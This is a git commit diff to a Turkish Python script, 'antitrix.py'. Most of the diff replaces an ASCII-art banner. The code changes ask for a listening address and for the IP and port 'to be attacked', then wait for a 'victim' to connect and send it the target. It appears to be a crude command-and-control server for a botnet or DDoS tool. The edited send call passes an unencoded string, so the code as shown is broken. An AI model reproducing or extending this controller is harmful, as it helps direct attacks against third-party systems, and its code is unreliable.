28d00ced5698be9d57fb636bdd08d6e5178a746a
M4Nyak <119705619+M4Nyak@users.noreply.github.com>
2023-03-29 12:22:30 +0300

    Update antitrix.py

--- antitrix.py
+++ antitrix.py
@@ -14,53 +14,55 @@ print(colored("""\
 |  _  || . ` |  | |    | |    | |  |    /   | |   /   \  
 | | | || |\  |  | |   _| |_   | |  | |\ \  _| |_ / /^\ 
 \_| |_/\_| \_/  \_/   \___/   \_/  \_| \_| \___/ \/   \/
-
-                      .7JYYY?^                              
-                     :5Y5PYGGGJ.                            
-                     .GP5555P555:                           
-                      ~PPJ7?JYY5P:                          
-                       .!YY!!J5PP5:                         
-                          ^J5?JYY5P???7!~:.         ^?JJ?!: 
-                          ~?G5JY55BGGGGGGPG7 :7^.  YPPY55Y5^
-                         7GPGGPPPGBGBBBGGG#?^PGG57?PJY5PPPB!
-                       ^?PP55555555555PGBBGGGBPPPGB7~JYPPPP^
-                     !YP55Y555PPPPP55YYY55GBGGBGPB5!?YYY5Y: 
-                   .JP5Y555PGBBBBBBBBGP5Y5YPBBGBB57Y555P7.  
-                  .555Y555JJY5PGGGBBBB#BPY5JPGBY5YJYY5GG:   
-                 ~G55JP55JJJJJJJY5PGGGBB#5Y5JGGG5GPPGBGBP.  
-   ....        .JB#J5?5PJJJJJJJ?JJJJY5PGBGJP?PGBBGBBB#GGBJ  
- ^JYYPY5?!:   .P#B#J5?PPJJJYYYYYJJJJJJJJP5J5?GGBGGBBBB#GB5  
-^PYPJGJ5??JJ7~!#BPBP?5YPGGGGGGPGYJJJJJ?J5J5?YGGBGBBBBB##J:  
-:5PPPYYP??7775YPGYJB5?YYPBBBBGGGGYJJJJY5Y5JJGGBBBBBBBBB#:   
- .JPGPPYYYJJY5?J5J?JBPJJY5PGBBBBGGYY55YYJJ5GGBBBBBBBBB#G.   
-   .:~7JYYPGPYYY5PGPPPG5YJJJYY5555YYYJJJ5GGGBBBB##B###5:    
-         ~PGGGGGGGGPP5PBBGP5YYYYYYYY55PGGBBBBB#B#BBPJ^      
-       .JBBGGBBBBBBBBB#GY75BGGGGGGGGBBBBGGB#B#BB#~:         
-      ~G#BGGBBB#G?77?J?^ 7#GGPPB5Y55GBGBBBBBBBB#Y           
-     ~BBGGBBBBP?:        ^5GBBBBY7YYPBGGB#BBB#B7            
-     J#BB#GY?^.            :7PBG5YPPPBGGB#BB#P:             
-     ^PY7^.                  ~G5YJJY5PBGG###?.              
-                             :GPJ55YJGBGBPY~                
-                              ~YPP5PGBGB~                   
-                               :GBG#GGB!                    
-                              ^G#GGBGB7                     
-                             !BBBGB#G~                      
-                           .J#BBGBBJ:                       
-                          ^P#BBGPJ^                         
-                         .?Y?7!^.  
+MMMMMMMMMMMMMMMMMMMMWXkolcccd0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMWWd;c;;;'.,:xNMMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMWWWd,::;;,;:;;dNMMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMWMXd;:oollc::,oNMMMMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMW0ocoxdc:;,,dNWWWMMMMWMMMMMMMMMWWWWWWW
+MMMMMMMMMMMMMMMMMMMMMMMMW0dclolc::;cdxxxO0NWMMMMMMMWXkddxk0N
+MMMMMMMMMMMMMMMMMMMMMMMMWXx:;lll:;'.''''';:lKWK0XWWOc,;:::ck
+MMMMMMMMMMMMMMMMMMMMMMMMXl''',;;,'......''.;Ox,,:dkl:c;;;;,l
+MMMMMMMMMMMMMMMMMMWWWWN0l,,;;;;;;;:;,,,'...,;'',,'.:xd:;,,'l
+MMMMMMMMMMMMMMMMWWWWNOl:;::;::;;;;;;;;::;,'.....'''okocc:;lX
+MMMMMMMMMMMMMMMMWWMKo:;:::;,'''......';::::,......:oc:;;;dXM
+MMMMMMMMMMMMMMMMWMKl;::;:::;,''.........,c::;..',;ll:;,'oNMM
+MMMMMMMMMMMMMMMMWOc;:::::lollcc:;,'......,::c,.,:;;:;,'.:0WM
+WWMMMWWMMMMMMMMNx,,:::;:llollloollc:;'....::c:'..'.......cXW
+WXOkkkOKNWMMWWKc..,clc;:oollloollololc:;''::c:'..........,kM
+Ol::,,:codOXWWo...,ccc;;::;;;;;;clloolloc;c:l:'..........;OM
+o::;;::lxxoodd,.''.:c::'....'''',:lllllc:cccc,'.........:KWM
+k:;,;;;coodxl::,;l:':lc:,........,colc:::clc;'..........lNMM
+NOoc;,;cccc::clc:cl,.;clc;,''....';c:;:ccl:,'...........xWMM
+MWWNKOddoc'';;:;,',,,'';ccllc:::::cccccc:,'...........;kWMMM
+MMMMMMWWXl'.'.....'',,...';::::::::::;,'...........,ckXWMMMM
+MMMMWWWk;..............;oc'''....'''.............c0XWMMMMMMM
+MMMMMXl.........:ddollxK0:.'',,'':::,...........,kWMMMMMMMMM
+MMMMXl.......':kNWMMMMMMXo,.....,olc;'.........;0WMMMMMMMMMM
+MMMM0,....':dONMMMMMMMMMWWKd:...,c:;,'........lXMMMMMMMMMMMM
+MMMMXl':oxKWMMMMMMMMMMMMMWWWK:.';ccc;'......'xNMMMMMMMMMMMMM
+MMMMWNKNMMMMMMMMMMMMMMMMMMWWNo',cc::c;.....:OWWMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMW0oc,;;;;'..;kKNWMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWXo....'.,kWMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNO;.'...'dWMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMWMWk:,.....'xNMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMMNd.......;ONWMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMMXl......,dXWWWMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMMK:.'',;cxKWWWMMMMMMMMMMMMMMMMMMMMMM
+MMMMMMMMMMMMMMMMMMMMMMMMM0odkO0KWMWWMMMMMMMMMMMMMMMMMMMMMMMM                           
                    
                     
                      
                       
-                       
-                        
-                          """,'red'))
+                       """,'red'))
 print('Antitrix başlatiliyor...')
 time.sleep(10)
 ipadresi= str(input('dinleme yapilacak ip:' ))
 port= int(input('dinlenicek port'))
-saldirilacaksite= input('saldirilacak web sitesi')
+saldirilacaksite= input('saldirilacak ip')
+saldirilacaksiteport= int(input('hedef sitenin portu:'))
 soket= socket.socket()
 soket.bind((ipadresi,port))
+print('Antitrix kurbanini bekliyor...')
+soket.listen()
 conn, addr= soket.accept()
-conn.sendall(saldirilacaksite.encode())
+conn.sendall(saldirilacaksite)
